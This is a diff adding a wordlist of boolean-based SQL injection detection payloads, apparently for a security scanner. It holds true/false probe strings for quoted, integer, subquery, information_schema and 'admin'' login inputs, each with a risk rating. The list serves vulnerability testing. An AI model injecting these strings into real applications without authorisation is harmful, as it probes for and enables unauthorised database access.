@@ -1,0 +1,26 @@
+# Boolean-Based SQL Injection Detection Payloads
+# Description: Payloads that use boolean conditions to detect vulnerabilities
+# Format: Payload|Description|Risk Level (Low/Medium/High)
+
+1' AND 1=1--|True condition test|Low
+1' AND 1=2--|False condition test|Low
+1" AND 1=1--|Double quote true condition|Low
+1" AND 1=2--|Double quote false condition|Low
+1 AND 1=1--|Integer-based true condition|Low
+1 AND 1=2--|Integer-based false condition|Low
+1' AND '1'='1|String-based true condition|Low
+1' AND '1'='2|String-based false condition|Low
+1" AND "1"="1|Double quote string-based true condition|Low
+1" AND "1"="2|Double quote string-based false condition|Low
+1' AND 3>2--|Numeric comparison true condition|Low
+1' AND 3<2--|Numeric comparison false condition|Low
+1' AND 5-5=0--|Zero true condition|Low
+1' AND 5-5=1--|Zero false condition|Low
+1' AND (SELECT 1)=1--|Subquery true condition|Medium
+1' AND (SELECT 0)=1--|Subquery false condition|Medium
+1' AND EXISTS(SELECT 1 FROM dual)--|Exists true condition|Medium
+1' AND NOT EXISTS(SELECT 1 FROM dual)--|Exists false condition|Medium
+1' AND (SELECT 1 FROM INFORMATION_SCHEMA.TABLES)=1--|Information schema true condition|Medium
+1' AND (SELECT 1 FROM INFORMATION_SCHEMA.TBALES)=1--|Nonexistent table false condition|Medium
+admin' AND 1=1--|Admin user true condition|Medium
+admin' AND 1=2--|Admin user false condition|Medium
